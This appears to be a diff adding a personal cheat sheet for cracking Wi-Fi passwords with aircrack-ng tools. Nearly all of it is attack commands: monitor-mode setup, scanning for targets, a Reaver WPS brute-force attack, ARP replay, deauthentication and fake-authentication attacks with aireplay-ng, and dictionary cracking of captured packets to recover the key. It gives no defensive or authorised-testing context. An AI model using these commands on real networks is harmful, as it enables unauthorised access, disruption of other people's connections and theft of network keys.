@@ -1,0 +1,39 @@
+1. start monitor:
+  sudo airmon-ng start wlan0
+  (you can kill all the process using wlan0)
+
+2. dump wifi info:
+  sudo airodump-ng mon0
+
+3. pick a wifi and get bssid, channel...
+
+4. wpa / wpa2:
+  using reaver, wps attack:
+    use the bssid picked above
+    or use 
+    sudo wash -i mon0 -c $channel -C
+    to find vulnerable wifi
+    
+    sudo reaver -i mon0 -c $channel -b $bssid -vv
+
+  password is WPA-PSK field
+
+4. wep / wpa / wpa2
+  gather info by sniffing packets: 
+    sudo airodump-ng -w $filename -c $channel -b $bssid mon0
+
+  open another terminal and start a type of a attack (try to get handshake or more packet):
+    a. arp attack: 
+      sudo aireplay-ng -3 -b $bssid mon0
+    
+    b. deauthentication attack:
+      sudo aireplay-ng -0 0 -a $bssid mon0
+
+    c. fake authentication attack:
+      sudo aireplay-ng -1 0 -a $bssid -h $(whatever_host_mac) -e $essid mon0
+
+  after collect over 20000 packets, we can solve the initial vector:
+    sudo aircrack-ng -w $(passwordList) $(filename).cap
+
+  get the key 
+
